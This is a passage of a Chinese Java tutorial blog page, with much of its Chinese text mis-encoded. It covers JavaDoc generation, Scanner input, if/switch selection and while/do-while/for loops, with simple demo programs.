src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230822192453952.png"></p><p>ç¬¬ä¸€æ­¥ï¼šé€‰æ‹©ç”ŸæˆJavaDocæ–‡æ¡£çš„èŒƒå›´ï¼Œæˆ‘åªå¯¹ä¸€ä¸ªæºæ–‡ä»¶ç”ŸæˆDocï¼Œæ‰€ä»¥é€‰æ‹©æ–‡ä»¶ã€‚<br>ç¬¬äºŒæ­¥ï¼šè¾“å‡ºç›®å½•æœ€å¥½æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œæ¯”è¾ƒæœ‰æ¡ç†å’Œæ•´æ´<br>ç¬¬ä¸‰æ­¥ï¼šåŒºåŸŸè®¾ç½®ï¼Œå†³å®šæ–‡æ¡£çš„è¯­è¨€ï¼Œç®€ä½“ä¸­æ–‡å°±æ˜¯zh_CNã€ç¹ä½“(å°æ¹¾)zh_twã€ç¹ä½“(é¦™æ¸¯)zh-hkã€è‹±è¯­(é¦™æ¸¯)en-hkã€è‹±è¯­(ç¾å›½)en-usã€è‹±è¯­(è‹±å›½)en-gbã€è‹±è¯­(å…¨çƒ)en-ww<br>ç¬¬å››æ­¥ï¼šå…¶ä»–å‘½ä»¤è¡Œå‚æ•°ï¼šå¦‚æœåŒºåŸŸè®¾ç½®ä¸ºä¸­å›½ï¼Œå‚æ•°ä¸€èˆ¬ä¸º-encoding UTF-8 -charset UTF-8<br>ç¬¬äº”æ­¥ï¼šè®¾ç½®å®Œæˆåç‚¹å‡»ç¡®å®šå³å¯ç”ŸæˆDocæ–‡æ¡£</p><h2 id="Javaæµç¨‹æ§åˆ¶"><a href="#Javaæµç¨‹æ§åˆ¶" class="headerlink" title="Javaæµç¨‹æ§åˆ¶"></a>Javaæµç¨‹æ§åˆ¶</h2><p>###Scannerå¯¹è±¡</p><p>åŸºæœ¬è¯­æ³•</p><p>Scanner  s &#x3D;new Scannerï¼ˆSystem.in)</p><p>é€šè¿‡Scanner ç±»çš„nextï¼ˆï¼‰ä¸newxtLine()æ–¹æ³•è·å–è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œåœ¨è¯»å–é’±æˆ‘ä»¬ä¸€èˆ¬éœ€è¦æ˜¯hasNext()ä¸NextLineï¼ˆï¼‰åˆ¤æ–­æ˜¯å¦è¿˜æœ‰è¾“å…¥çš„æ•°æ®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//åˆ›å»ºä¸€ä¸ªæ‰«æå™¨å¯¹è±¡ï¼Œç”¨äºæ¥å—é”®ç›˜æ•°æ®</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;ä½¿ç”¨nextæ–¹å¼æ¥æ”¶ï¼š&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ¤æ–­ç”¨æˆ·æœ‰æ²¡æœ‰è¾“å…¥å­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(scanner.hasNext())&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨nextæ–¹å¼åŠæ¥æ”¶</span></span><br><span class="line">             <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span>scanner.next();</span><br><span class="line">            System.out.println(<span class="string">&quot;è¾“å‡ºçš„å†…å®¹ä¸ºï¼š&quot;</span>+str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//å‡¡æ˜¯è¾“å…¥IOæµçš„ç±»å¦‚æœä¸å…³é—­ä¼šä¸€ç›´å ç”¨èµ„æºï¼Œè¦å…»æˆè‰¯å¥½çš„ä¹ æƒ¯ç”¨å®Œå°±å…³é—­</span></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="next-ä¸-nextLine-åŒºåˆ«"><a href="#next-ä¸-nextLine-åŒºåˆ«" class="headerlink" title="next() ä¸ nextLine() åŒºåˆ«"></a>next() ä¸ nextLine() åŒºåˆ«</h3><p>next():</p><ul><li>1ã€ä¸€å®šè¦è¯»å–åˆ°æœ‰æ•ˆå­—ç¬¦åæ‰å¯ä»¥ç»“æŸè¾“å…¥ã€‚</li><li>2ã€å¯¹è¾“å…¥æœ‰æ•ˆå­—ç¬¦ä¹‹å‰é‡åˆ°çš„ç©ºç™½ï¼Œnext() æ–¹æ³•ä¼šè‡ªåŠ¨å°†å…¶å»æ‰ã€‚</li><li>3ã€åªæœ‰è¾“å…¥æœ‰æ•ˆå­—ç¬¦åæ‰å°†å…¶åé¢è¾“å…¥çš„ç©ºç™½ä½œä¸ºåˆ†éš”ç¬¦æˆ–è€…ç»“æŸç¬¦ã€‚ </li><li>next() ä¸èƒ½å¾—åˆ°å¸¦æœ‰ç©ºæ ¼çš„å­—ç¬¦ä¸²ã€‚</li></ul><p>nextLine()ï¼š </p><ul><li>1ã€ä»¥Enterä¸ºç»“æŸç¬¦,ä¹Ÿå°±æ˜¯è¯´ nextLine()æ–¹æ³•è¿”å›çš„æ˜¯è¾“å…¥å›è½¦ä¹‹å‰çš„æ‰€æœ‰å­—ç¬¦ã€‚ </li><li>2ã€å¯ä»¥è·å¾—ç©ºç™½ã€‚</li></ul><p>å¦‚æœè¦è¾“å…¥ int æˆ– float ç±»å‹çš„æ•°æ®ï¼Œåœ¨ Scanner ç±»ä¸­ä¹Ÿæœ‰æ”¯æŒï¼Œä½†æ˜¯åœ¨è¾“å…¥ä¹‹å‰æœ€å¥½å…ˆä½¿ç”¨ hasNextXxx() æ–¹æ³•è¿›è¡ŒéªŒè¯ï¼Œå†ä½¿ç”¨ nextXxx() æ¥è¯»å–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//ä»é”®ç›˜æ¥æ”¶æ•°æ®</span></span><br><span class="line">        Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;ä½¿ç”¨nextæ–¹å¼æ¥æ”¶ï¼š&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (scanner.hasNext()) &#123;</span><br><span class="line">            <span class="comment">//åˆ¤æ–­æ˜¯å¦è¿˜æœ‰è¾“å…¥</span></span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span>scanner.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;è¾“å…¥æ•°æ®ä¸ºï¼š&quot;</span>+str);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo05</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//æˆ‘ä»¬è¦è¾“å…¥å¤šä¸ªæ•°å­—ï¼Œå¹¶æ±‚å…¶æ€»å’Œå’Œå¹³å‡æ•°ï¼Œæ²¡è¾“å…¥ä¸€ä¸ªæ•°å­—å›è½¦ç¡®è®¤ï¼Œé€šè¿‡è¾“å…¥éæ•°å­—æ¥ç»“æŸå¹¶è¾“å‡ºç»“æœ</span></span><br><span class="line">    Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    <span class="type">double</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//è®¡ç®—è¾“å…¥äº†å¤šå°‘ä¸ªæ•°å­—</span></span><br><span class="line">    <span class="type">int</span> m=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//é€šè¿‡å¾ªç¯åˆ¤æ–­æ˜¯å¦è¿˜æœ‰è¾“å…¥ï¼Œå¹¶åœ¨é‡Œé¢æ¯ä¸€æ¬¡è¿›è¡Œæ±‚å’Œå’Œç»Ÿè®¡</span></span><br><span class="line">    <span class="keyword">while</span>(scanner.hasNextDouble()) &#123;</span><br><span class="line">        <span class="type">double</span> <span class="variable">x</span> <span class="operator">=</span> scanner.nextDouble();</span><br><span class="line">        m = m + <span class="number">1</span>;</span><br><span class="line">        sum = sum + x;</span><br><span class="line">        System.out.println(<span class="string">&quot;ä½ è¾“å…¥äº†ç¬¬&quot;</span>+m+<span class="string">&quot;ä¸ªæ•°æ®&quot;</span>+<span class="string">&quot;,ç„¶åå½“å‰æ•°æ®æ˜¯&quot;</span>+sum);</span><br><span class="line">    &#125;</span><br><span class="line">        System.out.println(m+<span class="string">&quot;ä¸ªæ•°çš„å’Œä¸º&quot;</span>+sum);</span><br><span class="line">        System.out.println(m+<span class="string">&quot;ä¸ªæ•°çš„å¹³å‡å€¼æ˜¯&quot;</span>+(sum/m));</span><br><span class="line">    scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é¡ºåºç»“æ„"><a href="#é¡ºåºç»“æ„" class="headerlink" title="é¡ºåºç»“æ„"></a>é¡ºåºç»“æ„</h3><p>ä»£ç ä¾æ¬¡æ‰§è¡Œçš„ç»“æ„</p><p>ä»»ä½•ä¸€ç§ç»“æ„çš„åŸºæœ¬ç»“æ„</p><h3 id="ifé€‰æ‹©ç»“æ„"><a href="#ifé€‰æ‹©ç»“æ„" class="headerlink" title="ifé€‰æ‹©ç»“æ„"></a>ifé€‰æ‹©ç»“æ„</h3><p>è¯­æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(å¸ƒå°”è¡¨è¾¾å¼)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¦‚æœå¸ƒå°”è¡¨è¾¾å¼æˆç«‹ä¼šæ€ä¹ˆæ ·</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¦‚æœå¸ƒå°”è¡¨è¾¾å¼ä¸ºfalse</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(å¸ƒå°”è¡¨è¾¾å¼<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¦‚æœå¸ƒå°”è¡¨è¾¾å¼æˆç«‹ä¼šæ€ä¹ˆæ ·</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (å¸ƒå°”è¡¨è¾¾å¼<span class="number">2</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¦‚æœå¸ƒå°”è¡¨è¾¾å¼ä¸ºfalse</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (å¸ƒå°”è¡¨è¾¾å¼<span class="number">3</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¦‚æœå¸ƒå°”è¡¨è¾¾å¼ä¸ºfalse</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230823092226066.png" alt="image-20230823092226066"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IFDemo03</span>  &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    System.out.println(<span class="string">&quot;è¯·è¾“å…¥è€ƒè¯•æˆç»©ï¼š&quot;</span>);</span><br><span class="line">    <span class="type">int</span> sorce=scanner.nextInt();</span><br><span class="line">    <span class="keyword">if</span>(sorce==<span class="number">100</span>)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ­å–œä½ ï¼Œæˆç»©æ»¡åˆ†ï¼å¤ªæ£’äº†&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sorce&lt;<span class="number">100</span>&amp;&amp;sorce&gt;<span class="number">90</span>)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ï¼è¿˜ä¸é”™å‘¦&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sorce&lt;<span class="number">90</span>&amp;&amp;sorce&gt;<span class="number">80</span>)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ç»§ç»­åŠªåŠ›ï¼Œä½ å¯ä»¥å˜å¾—æ›´å¥½&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sorce&lt;<span class="number">80</span>&amp;&amp;sorce&gt;<span class="number">70</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æœ‰ç‚¹è½ä¸‹äº†ï¼Œå¿«ç‚¹è·Ÿä¸Šå•Šï¼ï¼ï¼ï¼&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sorce&lt;<span class="number">70</span>&amp;&amp;sorce&gt;<span class="number">60</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ä¸è¦ç°å¿ƒï¼Œç›¸ä¿¡ä½ å¯ä»¥çš„ï¼ï¼&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>  &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;åˆ«å­¦äº†ï¼Œå›å®¶ç§åœ°å§ï¼ï¼ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ifåµŒå¥—ç»“æ„"><a href="#ifåµŒå¥—ç»“æ„" class="headerlink" title="ifåµŒå¥—ç»“æ„"></a>ifåµŒå¥—ç»“æ„</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(å¸ƒå°”è¡¨è¾¾å¼)&#123;</span><br><span class="line"></span><br><span class="line">if(å¸ƒå°”è¡¨è¾¾å¼)&#123;</span><br><span class="line"></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>####switchå¤šé€‰æ‹©ç»“æ„</p><p>switchè¯­å¥ä¸­å˜é‡ç±»å‹å¯ä»¥æ˜¯ï¼š</p><p>byte,short,int char</p><p>ä»javaSE7å¼€å§‹</p><p>switchæ”¯æŒStringç±»å‹</p><p>åŒäº‹caseæ ‡ç­¾å¿…é¡»ä¸ºå­—ç¬¦ä¸²å¸¸é‡æˆ–å­—é¢é‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(expression)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> value:</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¯­å¥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>:<span class="comment">//å¯é€‰</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> valueï¼š</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¯­å¥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//ä½ å¯ä»¥æœ‰ä»»æ„æ•°é‡çš„caseè¯­å¥</span></span><br><span class="line"><span class="keyword">default</span>:<span class="comment">//å¯é€‰</span></span><br><span class="line"><span class="comment">//è¯­å¥</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>###å¾ªç¯ç»“æ„</p><h4 id="whileå¾ªç¯"><a href="#whileå¾ªç¯" class="headerlink" title="whileå¾ªç¯"></a>whileå¾ªç¯</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">whileï¼ˆå¸ƒå°”è¡¨è¾¾å¼ï¼‰&#123;</span><br><span class="line"></span><br><span class="line">//å¾ªç¯å†…å®¹</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªè¦å¸ƒå°”è¡¨è¾¾å¼ä¸ºtrueï¼Œå¾ªç¯å°±ä¼šä¸€ç›´æ‰§è¡Œä¸‹å»ã€‚<br>æˆ‘ä»¬å¤§å¤šæ•°æƒ…å†µæ˜¯ä¼šè®©å¾ªç¯åœæ­¢ä¸‹æ¥çš„ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªè®©è¡¨è¾¾å¼å¤±æ•ˆçš„æ–¹å¼æ¥ç»“æŸå¾ªç¯ã€‚å°‘éƒ¨åˆ†æƒ…å†µéœ€è¦å¾ªç¯ä¸€ç›´æ‰§è¡Œï¼Œæ¯”å¦‚æœåŠ¡å™¨çš„è¯·æ±‚å“åº”ç›‘å¬ç­‰ã€‚<br>å¾ªç¯æ¡ä»¶ä¸€ç›´ä¸ºtrueå°±ä¼šé€ æˆæ— é™å¾ªç¯ã€æ­»å¾ªç¯ã€‘ï¼Œæˆ‘ä»¬æ­£å¸¸çš„ä¸šåŠ¡ç¼–ç¨‹ä¸­åº”è¯¥å°½é‡é¿å…æ­»å¾ªç¯ã€‚ä¼šå½±å“ç¨‹åºæ€§èƒ½æˆ–è€…é€ æˆç¨‹åºå¡æ­»å¥”æºƒ!</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WhilDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//è¾“å‡º1-100</span></span><br><span class="line">         <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">         <span class="keyword">while</span>(i&lt;<span class="number">100</span>)&#123;</span><br><span class="line">             i++;</span><br><span class="line">             System.out.println(i);</span><br><span class="line">         &#125;</span><br><span class="line"><span class="comment">//        System.out.println();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WhileDemo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">            sum=sum+i;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="doâ€¦whileå¾ªç¯"><a href="#doâ€¦whileå¾ªç¯" class="headerlink" title="doâ€¦whileå¾ªç¯"></a>doâ€¦whileå¾ªç¯</h4><p>å¯¹äºwhileè¯­å¥è€Œè¨€ï¼Œå¦‚æœä¸æ»¡è¶³æ¡ä»¶ï¼Œåˆ™ä¸èƒ½è¿›å…¥å¾ªç¯ã€‚ä½†æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦å³ä½¿ä¸æ»¡è¶³æ¡ä»¶ä¹Ÿè‡³å°‘æ‰§è¡Œä¸€æ¬¡ã€‚<br>doâ€¦whileå¾ªç¯å’Œwhileå¾ªç¯ç›¸ä¼¼ï¼Œä¸åŒçš„æ˜¯ï¼Œdoâ€¦whileå¾ªç¯è‡³å°‘ä¼šæ‰§è¡Œä¸€æ¬¡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">do &#123;</span><br><span class="line">//ä»£ç è¯­å¥</span><br><span class="line">&#125;while(å¸ƒå°”è¡¨è¾¾å¼);</span><br></pre></td></tr></table></figure><p>Whileå’Œdo-Whileçš„åŒºåˆ«:<br>whileå…ˆåˆ¤æ–­åæ‰§è¡Œã€‚dowhileæ˜¯å…ˆæ‰§è¡Œååˆ¤æ–­!<br>Doâ€¦whileæ€»æ˜¯ä¿è¯å¾ªç¯ä½“ä¼šè¢«è‡³å°‘æ‰§è¡Œä¸€æ¬¡!è¿™æ˜¯ä»–ä»¬çš„ä¸»è¦å·®åˆ«ã€‚</p><h4 id="Forå¾ªç¯"><a href="#Forå¾ªç¯" class="headerlink" title="Forå¾ªç¯"></a>Forå¾ªç¯</h4><p>è™½ç„¶æ‰€æœ‰å¾ªç¯ç»“æ„éƒ½å¯ä»¥ç”¨whileæˆ–è€…doâ€¦whileè¡¨ç¤ºï¼Œä½†Javaæä¾›äº†å¦ä¸€ç§è¯­å¥â€”â€”foå¾ªç¯ï¼Œä½¿ä¸€äº›å¾ªç¯ç»“æ„å˜å¾—æ›´åŠ ç®€å•ã€‚<br>forå¾ªç¯è¯­å¥æ˜¯æ”¯æŒè¿­ä»£çš„ä¸€ç§é€šç”¨ç»“æ„ï¼Œæ˜¯æœ€æœ‰æ•ˆã€æœ€çµæ´»çš„å¾ªç¯ç»“æ„ã€‚forå¾ªç¯æ‰§è¡Œçš„æ¬¡æ•°æ˜¯åœ¨æ‰§è¡Œå‰å°±ç¡®å®šçš„ã€‚è¯­æ³•æ ¼å¼å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for(åˆå§‹åŒ–;å¸ƒå°”è¡¨è¾¾å¼;æ›´æ–°)&#123;</span><br><span class="line">//ä»£ç è¯­å¥</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>100.for</strong>æ¥å›è½¦è‡ªåŠ¨ç”Ÿæˆforå¾ªç¯è¯­å¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a=<span class="number">1</span>;<span class="comment">//åˆå§‹åŒ–æ¡ä»¶</span></span><br><span class="line">        <span class="keyword">while</span>(a&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">            System.out.println(a);</span><br><span class="line">            a+=<span class="number">2</span>;<span 